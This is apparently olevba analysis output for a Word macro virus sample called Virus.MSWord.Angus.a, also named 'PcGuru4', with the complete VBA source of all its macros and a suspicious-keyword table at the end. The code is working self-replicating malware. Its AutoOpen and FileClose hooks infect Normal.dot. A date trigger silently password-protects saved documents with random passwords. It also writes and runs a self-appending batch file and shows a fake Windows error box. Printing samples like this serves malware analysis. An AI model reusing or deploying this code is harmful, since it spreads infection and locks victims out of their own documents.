olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NHukjbnBp.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/NHukjbnBp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Αποθήκευση του ενεργού εγγράφου ή προτύπου"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
Dim F$
Dim h
Dim g
Dim T$
'by NAENBGOURSG
                  
On Error GoTo -1: On Error GoTo Z
F$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Format:=1

If WordBasic.[GetDocumentVar$]("M 4") <> "" Then
 For h = 1 To 7
  WordBasic.ToolsMacro Name:=WordBasic.[GetDocumentVar$]("M" + Str(h)), Delete:=1
 Next h
End If

For g = 1 To 7
WordBasic.SetDocumentVar "M" + Str(g), pn$
Next g

  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 1")
 WordBasic.MacroCopy "FileSave", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 2")
 WordBasic.MacroCopy "FileSaveAs", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 3")
 WordBasic.MacroCopy "FilePrint", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 4")
 WordBasic.MacroCopy "FilePrintDefault", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 5")
 WordBasic.MacroCopy "FileTemplates", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 6")
 WordBasic.MacroCopy "FileExit", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 7")
 WordBasic.MacroCopy "PCGURU4", T$, 1

 T$ = F$ + ":FileClose"
 WordBasic.MacroCopy "FC", T$, 1
  T$ = F$ + ":AutoOpen"
 WordBasic.MacroCopy "NOpen", T$, 1


WordBasic.FileSave
GoTo Q

Z:
WordBasic.FileSave

Q:

End Sub



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO uyrGYO.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/uyrGYO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Αποθήκευση ενός αντιγράφου του εγγράφου σε άλλο χωριστό αρχείο"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim F$
Dim h
Dim g
Dim T$
Dim pswr$
'by NAENBGOURSG

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Z
F$ = WordBasic.[FileName$]()
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then
      dlg.Format = 1
End If

If WordBasic.[GetDocumentVar$]("M 4") <> "" Then
 For h = 1 To 7
  WordBasic.ToolsMacro Name:=WordBasic.[GetDocumentVar$]("M" + Str(h)), Delete:=1
 Next h
End If

For g = 1 To 7
WordBasic.SetDocumentVar "M" + Str(g), pn$
Next g

  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 1")
 WordBasic.MacroCopy "FileSave", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 2")
 WordBasic.MacroCopy "FileSaveAs", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 3")
 WordBasic.MacroCopy "FilePrint", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 4")
 WordBasic.MacroCopy "FilePrintDefault", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 5")
 WordBasic.MacroCopy "FileTemplates", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 6")
 WordBasic.MacroCopy "FileExit", T$, 1
  T$ = F$ + ":" + WordBasic.[GetDocumentVar$]("M 7")
 WordBasic.MacroCopy "PCGURU4", T$, 1

  T$ = F$ + ":FileClose"
 WordBasic.MacroCopy "FC", T$, 1
  T$ = F$ + ":AutoOpen"
 WordBasic.MacroCopy "NOpen", T$, 1

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 And WordBasic.Hour(WordBasic.Now()) = 12 And WordBasic.Minute(WordBasic.Now()) > 30 Then
pswr$ = pas$
dlg.Password = pswr$
WordBasic.SetProfileString "PCGURU", WordBasic.[FileName$]() + Str(WordBasic.Minute(WordBasic.Now())) + Str(WordBasic.Second(WordBasic.Now())), pswr$ + "NAENBGOURSG"
End If

WordBasic.FileSaveAs dlg
GoTo Q

Z:
 If Err.Number <> 102 Then
  WordBasic.FileSaveAs dlg
 End If
Q:

End Sub



Private Function pas$()
Dim count_
Dim ab
Dim cd
Dim ef
Dim xx
Dim xP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 9) + 9)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)
  ef = WordBasic.Int(Rnd() * (57 - 48) + 48)
  
  xx = Rnd()
  If xx < 0.35 Then
      xP$ = xP$ + Chr(ab)
  ElseIf (xx > 0.34) And (xx < 0.68) Then
      xP$ = xP$ + Chr(cd)
  Else
      xP$ = xP$ + Chr(ef)
  End If
Next count_
pas$ = xP$

End Function



Private Function pn$()
Dim count_
Dim ab
Dim cd
Dim ss
Dim sP$

For count_ = 1 To WordBasic.Int(Rnd() * (11 - 5) + 5)
  ab = WordBasic.Int(Rnd() * (90 - 65) + 65)
  cd = WordBasic.Int(Rnd() * (122 - 97) + 97)

  ss = Rnd()
  If ss < 0.5 Then
      sP$ = sP$ + Chr(ab)
  Else
      sP$ = sP$ + Chr(cd)
  End If
Next count_
pn$ = sP$

End Function
-------------------------------------------------------------------------------
VBA MACRO HhYekIELT.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/HhYekIELT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Εκτύπωση του ενεργού εγγράφου"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
Dim i
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 Then
    WordBasic.ScreenUpdating 0
    WordBasic.EndOfDocument
    For i = 15 To 24
       WordBasic.FontSize i
       WordBasic.Bold
       WordBasic.InsertPara
       WordBasic.Insert "NAENBGOURSG"
    Next i
    WordBasic.InsertPara
    WordBasic.Insert "Hello from GREECE"
    WordBasic.StartOfDocument
    WordBasic.SetProfileString "PCGURU", "Print", "1"
End If

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint dlg
WordBasic.Dialog.FilePrint dlg
WordBasic.FilePrint dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO PoWNmLGYJg.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/PoWNmLGYJg'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Εκτύπωση του ενεργού εγγράφου με τις προεπιλεγμένες παραμέτρους εκτύπωσης"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrintDefault.MAIN"
Dim i
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 23 And WordBasic.Month(WordBasic.Now()) = 10 Then
    WordBasic.ScreenUpdating 0
    WordBasic.EndOfDocument
    For i = 15 To 24
       WordBasic.FontSize i
       WordBasic.Bold
       WordBasic.InsertPara
       WordBasic.Insert "NAENBGOURSG"
    Next i
    WordBasic.InsertPara
    WordBasic.Insert "Hello from GREECE"
    WordBasic.StartOfDocument
    WordBasic.SetProfileString "PCGURU", "Print", "1"
End If

WordBasic.FilePrintDefault
End Sub
-------------------------------------------------------------------------------
VBA MACRO xMlOFIqU.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/xMlOFIqU'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Αλλαγή του ενεργού προτύπου και των επιλογών του"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
'by NAENBGOURSG
WordBasic.Beep
WordBasic.MsgBox "Windows Protection Error", "Microsoft Windows", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO LxCLcEggG.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/LxCLcEggG'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Έξοδος από το Microsoft Word με ερώτηση επιβεβαίωσης για την αποθήκευση των εγγράφων"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
'by NAENBGOURSG

If WordBasic.Day(WordBasic.Now()) = 24 And WordBasic.Month(WordBasic.Now()) = 10 And WordBasic.[GetProfileString$]("PCGURU", "Print") <> "" Then
  WordBasic.ScreenUpdating 0
  WordBasic.ChDir WordBasic.[DefaultDir$](2)
  WordBasic.Shell "PCGURU4.BAT", 0
End If

If WordBasic.[FileName$]() <> "" Then
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
End If

WordBasic.FileExit
End Sub
-------------------------------------------------------------------------------
VBA MACRO TMBoiC.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/TMBoiC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
'dull macro

'by NAENBGOURSG
'SO.HT.AI.KS
'231076 -- GREECE
'VRD 23-4-1997
'VRP A.U.A

End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
On Error GoTo -1: On Error GoTo xxut
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="1"

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 0

 iMacroCount = WordBasic.CountMacros(0, 0)
 For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "PCGURU4" Then
        bInstalled = -1
    End If
 Next i
 If Not bInstalled Then
    WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\PcGuru2"
    WordBasic.CopyFile FileName:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Directory:=WordBasic.[DefaultDir$](2) + "\PcGuru2"
SetAttr WordBasic.[DefaultDir$](2) + "\PcGuru2", 2


WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "NOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "FC"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 1"), "FileSave"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 2"), "FileSaveAs"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 3"), "FilePrint"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 4"), "FilePrintDefault"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "FileTemplates"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "ToolsMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 6"), "FileExit"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 7"), "PCGURU4"
    

    Open WordBasic.[DefaultDir$](2) + "\PcGuru4.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "Rem PcGuru4 virus by NAENBGOURSG"
    Print #1, "Rem Golden Version 4.3"
    Print #1, "type PcGuru4.bat >> PcGuru4.bat"
    Close 1
 
End If
'by NAENBGOURSG

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 1

xxut:
WordBasic.FileClose
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Angus.a-c52eefce6580aeced57a13a4cc7fdacb7120802e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim iMacroCount
Dim i
Dim bInstalled
On Error GoTo -1: On Error GoTo bail
WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="1"

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 0

 iMacroCount = WordBasic.CountMacros(0, 0)
 For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "PCGURU4" Then
        bInstalled = -1
    End If
 Next i
 If Not bInstalled Then
    WordBasic.MkDir WordBasic.[DefaultDir$](2) + "\PcGuru2"
    WordBasic.CopyFile FileName:=WordBasic.[DefaultDir$](2) + "\Normal.dot", Directory:=WordBasic.[DefaultDir$](2) + "\PcGuru2"
SetAttr WordBasic.[DefaultDir$](2) + "\PcGuru2", 2


WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "NOpen"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileClose", "FC"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 1"), "FileSave"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 2"), "FileSaveAs"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 3"), "FilePrint"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 4"), "FilePrintDefault"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "FileTemplates"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 5"), "ToolsMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 6"), "FileExit"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + WordBasic.[GetDocumentVar$]("M 7"), "PCGURU4"
    

    Open WordBasic.[DefaultDir$](2) + "\PcGuru4.bat" For Output As 1
    Print #1, "@echo off"
    Print #1, "Rem PcGuru4 virus by NAENBGOURSG"
    Print #1, "Rem Golden Version 4.3"
    Print #1, "type PcGuru4.bat >> PcGuru4.bat"
    Close 1
 
End If
'by NAENBGOURSG

SetAttr WordBasic.[DefaultDir$](2) + "\Normal.dot", 1

bail:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PCGURU4.BAT         |Executable file name                         |
|IOC       |PcGuru4.bat         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

